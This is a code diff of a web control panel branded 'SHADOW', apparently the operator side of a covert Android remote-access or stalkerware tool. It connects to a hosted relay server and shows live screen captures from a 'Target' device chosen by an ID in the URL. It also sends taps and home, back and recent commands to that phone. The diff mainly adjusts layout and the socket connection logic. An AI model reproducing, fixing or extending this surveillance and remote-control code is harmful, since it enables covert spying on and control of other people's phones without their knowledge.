@@ -25,13 +25,12 @@
         /* --- Header --- */
         .top-nav {
             padding: 15px 20px; background: var(--panel-bg); border-bottom: 1px solid #333;
-            display: flex; justify-content: space-between; align-items: center; z-index: 100;
+            display: flex; justify-content: space-between; align-items: center; z-index: 10;
         }
         .brand { font-size: 1.2rem; font-weight: bold; color: var(--accent); letter-spacing: 1px; }
         .status-badge { font-size: 0.9rem; display: flex; align-items: center; gap: 8px; }
         .live-dot { height: 10px; width: 10px; background-color: var(--danger); border-radius: 50%; box-shadow: 0 0 5px var(--danger); }
-        .live-dot.active { background-color: var(--accent); box-shadow: 0 0 8px var(--accent); animation: blink 1s infinite; }
-        @keyframes blink { 50% { opacity: 0.5; } }
+        .live-dot.active { background-color: var(--accent); box-shadow: 0 0 8px var(--accent); }
 
         /* --- Main Layout --- */
         .screen-container {
@@ -40,66 +39,63 @@
 
         /* --- Phone Frame --- */
         .phone-frame {
-            width: 310px; height: 620px; border: 10px solid #222; border-radius: 35px;
-            background: #000; position: relative; box-shadow: 0 0 50px rgba(0,0,0,0.8);
+            width: 300px; height: 600px; border: 8px solid #222; border-radius: 30px;
+            background: #000; position: relative; box-shadow: 0 0 50px rgba(0,0,0,0.5);
             overflow: hidden; display: flex; align-items: center; justify-content: center;
         }
-        #screenStream { width: 100%; height: 100%; object-fit: contain; display: none; }
+        #screenStream { width: 100%; height: 100%; object-fit: contain; }
         
-        .offline-msg { position: absolute; color: #666; text-align: center; display: flex; flex-direction: column; align-items: center; }
+        .offline-msg { position: absolute; color: #444; text-align: center; display: flex; flex-direction: column; align-items: center; }
 
-        /* --- Controls (Laptop Taskbar Fix) --- */
+        /* --- Controls --- */
         .side-panel {
-            position: absolute; right: 30px; top: 50%; transform: translateY(-50%);
-            display: flex; flex-direction: column; gap: 12px;
-            background: rgba(26, 26, 26, 0.9); padding: 15px; border-radius: 20px; border: 1px solid #333;
-            max-height: 80vh; /* Screen se bahar nahi jayega */
-            overflow-y: auto;  /* Button zyada hone par scroll hoga */
-            scrollbar-width: none;
+            position: absolute; right: 30px; display: flex; flex-direction: column; gap: 15px;
+            background: rgba(26, 26, 26, 0.8); padding: 15px; border-radius: 20px; border: 1px solid #333;
         }
-        .side-panel::-webkit-scrollbar { display: none; }
-
         .control-btn {
             width: 50px; height: 50px; border-radius: 50%; background: #2a2a2a; border: 1px solid #444;
             color: white; display: flex; align-items: center; justify-content: center; cursor: pointer; transition: 0.2s; font-size: 1.2rem;
         }
         .control-btn:hover { border-color: var(--accent); color: var(--accent); transform: scale(1.1); }
+        .control-btn:active { transform: scale(0.9); }
 
         /* Navigation Bar */
         .nav-bar {
-            width: 100%; height: 50px; background: rgba(0, 0, 0, 0.9);
+            width: 100%; height: 50px; background: rgba(0, 0, 0, 0.8);
             position: absolute; bottom: 0; display: flex; justify-content: space-around; align-items: center; border-top: 1px solid #222;
         }
-        .nav-item { color: #888; font-size: 1.3rem; cursor: pointer; padding: 10px; }
+        .nav-item { color: #666; font-size: 1.2rem; cursor: pointer; padding: 10px; }
+        .nav-item:hover { color: white; }
 
         @media (max-width: 768px) {
-            .side-panel { position: fixed; top: auto; bottom: 70px; right: 10px; flex-direction: row; flex-wrap: wrap; width: 120px; transform: none; background: transparent; border: none; }
-            .phone-frame { width: 280px; height: 560px; }
+            .screen-container { flex-direction: column; }
+            .side-panel { position: relative; right: auto; flex-direction: row; margin-top: 20px; flex-wrap: wrap; justify-content: center; width: 100%; max-width: 300px; }
+            .phone-frame { width: 100%; max-width: 320px; height: auto; aspect-ratio: 9/19; }
         }
     </style>
 </head>
 <body>
 
     <div class="top-nav">
-        <div class="brand"><i class="fa-solid fa-ghost"></i> SHADOW ADMIN</div>
+        <div class="brand"><i class="fa-solid fa-ghost"></i> SHADOW</div>
         <div class="status-badge">
             <span class="live-dot" id="dot"></span> 
-            <span id="statusText" style="color:#888">Connecting...</span>
+            <span id="statusText" style="color:#888">Initializing...</span>
         </div>
     </div>
 
     <div class="screen-container">
         <div class="phone-frame">
             <div id="offlineMsg" class="offline-msg">
-                <i class="fa-solid fa-satellite-dish fa-spin fa-3x" style="color: var(--accent);"></i>
-                <p style="margin-top:15px" id="msgText">Waiting for Target...</p>
+                <i class="fa-solid fa-spinner fa-spin fa-2x"></i>
+                <p style="margin-top:10px" id="msgText">Connecting...</p>
             </div>
-            <img id="screenStream" src="" alt="Live Stream" onclick="sendClick(event)">
+            <img id="screenStream" src="" alt="" onclick="sendClick(event)">
             
             <div class="nav-bar">
                 <div class="nav-item" onclick="sendCommand('recent')"><i class="fa-regular fa-square"></i></div>
                 <div class="nav-item" onclick="sendCommand('home')"><i class="fa-regular fa-circle"></i></div>
-                <div class="nav-item" onclick="sendCommand('back')"><i class="fa-solid fa-caret-left"></i></div>
+                <div class="nav-item" onclick="sendCommand('back')"><i class="fa-solid fa-caret-left" style="font-size:1.5rem"></i></div>
             </div>
         </div>
 
@@ -115,63 +111,77 @@
 
     <script>
         const SERVER_URL = "https://child-v9no.onrender.com"; 
-        let socket = null;
+        let socket = null; // Defined explicitly
         let currentDeviceId = null;
 
-        const streamImg = document.getElementById('screenStream');
-        const offlineBox = document.getElementById('offlineMsg');
-        const statusTxt = document.getElementById('statusText');
-        const dot = document.getElementById('dot');
-
+        // 1. Start logic ONLY when page is ready
         window.addEventListener('load', function() {
             const urlParams = new URLSearchParams(window.location.search);
             currentDeviceId = urlParams.get('id');
 
             if (currentDeviceId) {
-                initSocket();
+                document.getElementById('statusText').innerText = "Target: " + currentDeviceId;
+                startConnection(); // Call connection logic
             } else {
-                statusTxt.innerText = "Error: ID Missing";
-                statusTxt.style.color = "var(--danger)";
+                document.getElementById('statusText').innerText = "No ID Found";
+                document.getElementById('msgText').innerText = "Error: Invalid Link";
+                document.getElementById('statusText').style.color = "var(--danger)";
             }
         });
 
-        function initSocket() {
+        function startConnection() {
+            // Check if IO library is loaded
+            if (typeof io === 'undefined') {
+                alert("Error: Socket.io library failed to load. Check internet.");
+                return;
+            }
+
+            // Initialize Socket
             socket = io(SERVER_URL, { 
-                transports: ['websocket'], 
-                reconnection: true 
+                transports: ['websocket', 'polling'], // Fallback options added
+                reconnection: true
             });
 
+            // 2. Event Listeners Setup
             socket.on("connect", () => {
-                statusTxt.innerText = "Online: " + currentDeviceId;
-                statusTxt.style.color = "var(--accent)";
-                dot.classList.add("active");
+                console.log("Web Connected!");
+                document.getElementById('statusText').innerText = "Online: " + currentDeviceId;
+                document.getElementById('statusText').style.color = "var(--accent)";
+                document.getElementById('dot').classList.add("active");
                 
-                // Server ko batao ki hum Admin hain aur is device ko monitor kar rahe hain
+                // IMPORTANT FIX: Join the SPECIFIC Device Room, not 'admin_monitor'
+                console.log("Joining Room: " + currentDeviceId);
                 socket.emit("join", currentDeviceId); 
             });
 
             socket.on("disconnect", () => {
-                statusTxt.innerText = "Disconnected";
-                statusTxt.style.color = "var(--danger)";
-                dot.classList.remove("active");
-                offlineBox.style.display = "flex";
-                streamImg.style.display = "none";
+                console.log("Disconnected");
+                document.getElementById('statusText').innerText = "Offline";
+                document.getElementById('statusText').style.color = "var(--danger)";
+                document.getElementById('dot').classList.remove("active");
+                document.getElementById('offlineMsg').style.display = "flex";
+                document.getElementById('msgText').innerText = "Server Disconnected";
             });
 
-            // 🔥 MAIN FIX: Screen data handle karne ka sahi tarika
+            // 3. Receive Image
             socket.on("screen-data", (data) => {
-                if (data && data.image) {
-                    offlineBox.style.display = "none";
-                    streamImg.style.display = "block";
-                    // Base64 image display
-                    streamImg.src = "data:image/jpeg;base64," + data.image;
-                }
+                // Since we joined the specific room, all data receiving here is for us
+                console.log("Image Recieved!"); // Debug log
+                document.getElementById('offlineMsg').style.display = "none";
+                document.getElementById('screenStream').src = "data:image/jpeg;base64," + data.image;
+            });
+
+            socket.on("connect_error", (err) => {
+                console.error("Connection Error:", err);
             });
         }
 
         function sendCommand(action) {
-            if(!socket || !socket.connected) return;
-            navigator.vibrate(40);
+            if(!socket || !currentDeviceId) {
+                console.warn("Socket not connected or No ID");
+                return;
+            }
+            navigator.vibrate(50);
             
             socket.emit("control-event", {
                 room: currentDeviceId,
@@ -181,12 +191,13 @@
         }
 
         function sendClick(event) {
-            if(!socket || !socket.connected) return;
+            if(!socket || !currentDeviceId) return;
             
-            const rect = streamImg.getBoundingClientRect();
-            // Scaling logic: Phone ki screen 1000x1000 ke scale par command leti hai
-            const x = Math.round(((event.clientX - rect.left) / rect.width) * 1000);
-            const y = Math.round(((event.clientY - rect.top) / rect.height) * 1000);
+            const img = document.getElementById('screenStream');
+            const rect = img.getBoundingClientRect();
+            
+            const x = Math.round(event.clientX - rect.left);
+            const y = Math.round(event.clientY - rect.top);
 
             socket.emit("control-event", {
                 room: currentDeviceId,
@@ -198,3 +209,4 @@
     </script>
 </body>
 </html>
+
